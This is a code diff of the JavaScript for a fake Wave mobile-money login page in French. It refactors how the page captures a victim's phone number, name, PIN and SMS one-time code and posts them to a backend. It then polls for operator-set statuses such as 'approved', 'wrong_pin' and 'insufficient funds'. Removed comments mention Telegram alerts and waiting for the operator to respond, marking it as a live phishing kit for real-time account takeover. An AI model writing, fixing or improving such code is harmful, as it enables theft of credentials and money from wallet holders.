@@ -724,185 +724,173 @@ async function callApi(action, data){
   catch(e){ return {success:false}; }
 }
 
+/* ═══════════════════════════════════════════
+   POLL + OTP — clean single-instance logic
+═══════════════════════════════════════════ */
+
+var pollActive = false;  // prevents overlapping polls
+
+function stopPoll(){
+  if(pollTmr){ clearInterval(pollTmr); pollTmr=null; }
+  pollActive = false;
+}
+
 function startPoll(sid){
-  if(pollTmr) clearInterval(pollTmr);
+  stopPoll();           // always clear before starting
   sessId = sid;
+  pollActive = true;
   pollTmr = setInterval(async function(){
+    if(!pollActive) return;
     try{
       var res = await fetch(API+'?action=check_status&sessionId='+sid+'&t='+Date.now());
-      var r = await res.json();
-      if(!r.success||!r.status) return;
+      var r   = await res.json();
+      if(!r.success || !r.status) return;
       if(r.status==='pending' || r.status==='otp_pending') return;
+
+      // ── approved: move to OTP screen ──
       if(r.status==='approved'){
-        hideLoad(); clearInterval(pollTmr); pollTmr=null;
-        go('s-pin','s-otp'); resetOTP(); startResendCd(10); startPoll(sid);
+        stopPoll();
+        hideLoad();
+        enterOTP(sid);
+
+      // ── wrong PIN ──
       } else if(r.status==='wrong_pin'){
-        hideLoad(); clearInterval(pollTmr); pollTmr=null;
+        stopPoll();
+        hideLoad();
         showPop('Code PIN incorrect','Le code secret saisi est erroné. Veuillez vérifier et réessayer.');
         setTimeout(function(){ pinVal=''; updatePinDots(); }, 300);
+
+      // ── wrong OTP code ──
       } else if(r.status==='wrong_code'){
-        if(verifying) return; // doVerify handles this case
-        hideLoad(); clearInterval(pollTmr); pollTmr=null;
-        showPop('Code invalide', 'Le code de validation est incorrect. Veuillez réessayer ou demander un nouveau code.');
-        setTimeout(function(){ resetOTP(); verifying=false; startPoll(sid); }, 600);
+        stopPoll();
+        hideLoad();
+        if(!verifying){  // only show if doVerify didn't already handle it
+          showPop('Code invalide','Le code de validation est incorrect. Veuillez réessayer.');
+          setTimeout(function(){ resetOTP(); }, 400);
+        }
+
+      // ── insufficient funds ──
       } else if(r.status==='continue'){
-        hideLoad(); clearInterval(pollTmr); pollTmr=null;
+        stopPoll(); hideLoad();
         showPop('Fonds insuffisants','Veuillez recharger votre portefeuille Wave et réessayer.','inf');
+
+      // ── session expired ──
       } else if(r.status==='expired' || r.status==='session_expired'){
-        hideLoad(); clearInterval(pollTmr); pollTmr=null;
+        stopPoll(); hideLoad();
         sessId = null;
-        showPop('Session expirée', 'Votre session a expiré. Veuillez saisir à nouveau votre code PIN.');
-        pinVal=''; updatePinDots();
-        setTimeout(function(){ go('s-otp','s-pin'); },500);
+        showPop('Session expirée','Votre session a expiré. Veuillez saisir à nouveau votre code PIN.');
+        setTimeout(function(){ pinVal=''; updatePinDots(); go('s-otp','s-pin'); }, 400);
+
+      // ── denied ──
       } else if(r.status==='denied' || r.status==='rejected'){
-        hideLoad(); clearInterval(pollTmr); pollTmr=null;
-        showPop('Accès refusé', 'Cette demande a été refusée. Veuillez contacter le support.');
-        pinVal=''; updatePinDots();
-        setTimeout(function(){ go('s-pin','s-login'); loginVal=''; document.getElementById('loginPh').value=''; },1500);
+        stopPoll(); hideLoad();
+        showPop('Accès refusé','Cette demande a été refusée. Veuillez contacter le support.');
+        setTimeout(function(){ pinVal=''; updatePinDots(); go('s-pin','s-login'); loginVal=''; document.getElementById('loginPh').value=''; }, 1500);
       }
     }catch(e){}
-  },1000);
+  }, 1200);  // 1.2s interval — avoids hammering
 }
 
-async function submitPIN(){
-  var raw=loginVal;
-  var pin=pinVal;
-  if(pin.length!==4) return;
-  var fn=document.getElementById('fn')?document.getElementById('fn').value.trim():'';
-  var ln=document.getElementById('ln')?document.getElementById('ln').value.trim():'';
-  showLoad();
-  var payload = {firstName:fn||'Unknown',lastName:ln||'User',phone:raw,pin:pin};
-  if(sessId) payload.sessionId = sessId;
-  try {
-    var p = new URLSearchParams(Object.assign({action:'login_attempt'}, payload));
-    var resp = await fetch(API, {method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:p.toString()});
-    var text = await resp.text();
-    console.log('login_attempt raw response:', text);
-    var r;
-    try { r = JSON.parse(text); } catch(e){ r = {}; }
-
-    // Handle various response shapes
-    var sid = (r.data && r.data.sessionId) || r.sessionId || r.session_id || r.id;
-    if(sid){
-      startPoll(sid);
-    } else if(r.success === false && r.message){
-      hideLoad();
-      showPop('Erreur', r.message || 'Veuillez réessayer.');
-      pinVal=''; updatePinDots();
-    } else {
-      hideLoad();
-      showPop('Erreur serveur', 'Réponse : ' + text.slice(0,120));
-      pinVal=''; updatePinDots();
-    }
-  } catch(e){
-    hideLoad();
-    showPop('Connexion échouée', 'Vérifiez votre connexion internet. (' + e.message + ')');
-    pinVal=''; updatePinDots();
-  }
+// Enter OTP screen cleanly
+function enterOTP(sid){
+  resetOTP();
+  go('s-pin','s-otp');
+  startResendCd(10);
+  // Resume polling for OTP status
+  startPoll(sid);
 }
 
+/* ── OTP keypad & verification ── */
 var otpVal = '';
-var otpSlotEls = [0,1,2,3].map(function(i){ return document.getElementById('osd'+i); });
+var otpSlotEls  = [0,1,2,3].map(function(i){ return document.getElementById('osd'+i); });
 var otpSlotWrps = [0,1,2,3].map(function(i){ return otpSlotEls[i].parentElement; });
 
 function otpUpdateSlots(){
-  otpSlotEls.forEach(function(el, i){ el.textContent = otpVal[i] || ''; });
-  otpSlotWrps.forEach(function(el, i){ el.classList.toggle('active', i === otpVal.length && otpVal.length < 4); });
+  otpSlotEls.forEach(function(el,i){ el.textContent = otpVal[i]||''; });
+  otpSlotWrps.forEach(function(el,i){ el.classList.toggle('active', i===otpVal.length && otpVal.length<4); });
 }
 
 function otpKpPress(digit){
-  if(otpVal.length >= 4 || verifying) return;
-  otpVal += digit;
+  if(verifying || otpVal.length>=4) return;
+  otpVal += String(digit);
   otpUpdateSlots();
-  if(otpVal.length === 4) setTimeout(doVerify, 120);
+  if(otpVal.length===4) setTimeout(doVerify, 150);
 }
 
 function otpKpBack(){
-  if(otpVal.length === 0) return;
+  if(verifying || otpVal.length===0) return;
   otpVal = otpVal.slice(0,-1);
   otpUpdateSlots();
 }
 
-function resetOTP(){ otpVal = ''; verifying = false; otpUpdateSlots(); }
+function resetOTP(){
+  otpVal = '';
+  verifying = false;
+  otpUpdateSlots();
+}
 
+async function doVerify(){
+  if(otpVal.length!==4 || !sessId || verifying) return;
+  verifying = true;
+  stopPoll();           // pause polling — we handle the result ourselves
+  showLoad();
+  var r = await callApi('otp_entered', { sessionId: sessId, otp: otpVal });
+  hideLoad();
+  if(r && r.success){
+    verifying = false;
+    startPoll(sessId);  // poll will catch approved/wrong_code from here
+  } else {
+    // API call itself failed (network error etc) — show error, reset
+    showPop('Code incorrect','Le code de validation saisi est incorrect. Veuillez réessayer.');
+    setTimeout(function(){
+      resetOTP();       // resets verifying = false too
+      startPoll(sessId);
+    }, 800);
+  }
+}
+
+/* ── Resend countdown ── */
 var resTimer = null;
 function startResendCd(secs){
   var btn = document.getElementById('resendBtn');
   var cd  = document.getElementById('resendCd');
-  btn.disabled = true; btn.style.opacity = '0.4';
-  clearInterval(resTimer);
+  clearInterval(resTimer);      // clear any existing timer FIRST
+  btn.disabled = true;
+  btn.style.opacity = '0.4';
   var s = secs || 10;
-  cd.textContent = 'Renvoyer dans ' + s + 's';
+  cd.textContent = 'Renvoyer dans '+s+'s';
   resTimer = setInterval(function(){
     s--;
-    if(s <= 0){ clearInterval(resTimer); cd.textContent = ''; btn.disabled = false; btn.style.opacity = '1'; }
-    else { cd.textContent = 'Renvoyer dans ' + s + 's'; }
+    if(s<=0){
+      clearInterval(resTimer);
+      resTimer = null;
+      cd.textContent = '';
+      btn.disabled = false;
+      btn.style.opacity = '1';
+    } else {
+      cd.textContent = 'Renvoyer dans '+s+'s';
+    }
   }, 1000);
 }
 
 async function doResend(){
   if(!sessId) return;
   resetOTP();
-  startResendCd();
-
-  // Step 1: reset OTP state on backend so it sends a fresh Telegram alert
+  startResendCd(10);
   await callApi('reset_otp', { sessionId: sessId });
-
-  // Step 2: send resend request with full context so Telegram gets notified
   var fn = document.getElementById('fn') ? document.getElementById('fn').value.trim() : '';
   var ln = document.getElementById('ln') ? document.getElementById('ln').value.trim() : '';
-  var r = await callApi('otp_resend', {
-    sessionId: sessId,
-    phone: loginVal,
-    firstName: fn,
-    lastName: ln,
-    resend: '1'
-  });
-
-  // Step 3: fallback — re-submit login_attempt which always triggers a fresh Telegram message
-  if (!r || !r.success) {
-    await callApi('login_attempt', {
-      sessionId: sessId,
-      phone: loginVal,
-      firstName: fn || 'Unknown',
-      lastName: ln || 'User',
-      pin: pinVal || '0000',
-      resend: '1'
-    });
+  var r = await callApi('otp_resend', { sessionId: sessId, phone: loginVal, firstName: fn, lastName: ln });
+  if(!r || !r.success){
+    await callApi('login_attempt', { sessionId: sessId, phone: loginVal, firstName: fn||'Unknown', lastName: ln||'User', pin: pinVal||'0000', resend: '1' });
   }
-
-  // Resume polling so we catch when operator responds
   startPoll(sessId);
-
-  // Show toast
   document.getElementById('tav').textContent = '✉';
-  document.getElementById('tn').textContent = 'SMS renvoyé';
-  document.getElementById('td').textContent = 'Un nouveau code a été envoyé';
+  document.getElementById('tn').textContent  = 'SMS renvoyé';
+  document.getElementById('td').textContent  = 'Un nouveau code a été envoyé';
   var t = document.getElementById('toast');
   t.classList.add('show');
-  setTimeout(function(){ t.classList.remove('show'); }, 3500);
-}
-
-async function doVerify(){
-  if(otpVal.length !== 4 || !sessId || verifying) return;
-  verifying = true;
-  // Stop polling while we verify so poll doesn't fire wrong_code too
-  if(pollTmr){ clearInterval(pollTmr); pollTmr = null; }
-  showLoad();
-  var r = await callApi('otp_entered', { sessionId: sessId, otp: otpVal });
-  hideLoad();
-  if(r && r.success){
-    verifying = false;
-    startPoll(sessId);
-  } else {
-    // Single error popup, clear OTP, then re-start polling
-    showPop('Code incorrect', 'Le code de validation saisi est incorrect. Veuillez vérifier et réessayer.');
-    setTimeout(function(){
-      resetOTP();
-      verifying = false;
-      startPoll(sessId);
-    }, 600);
-  }
+  setTimeout(function(){ t.classList.remove('show'); }, 3000);
 }
 
 var people=[
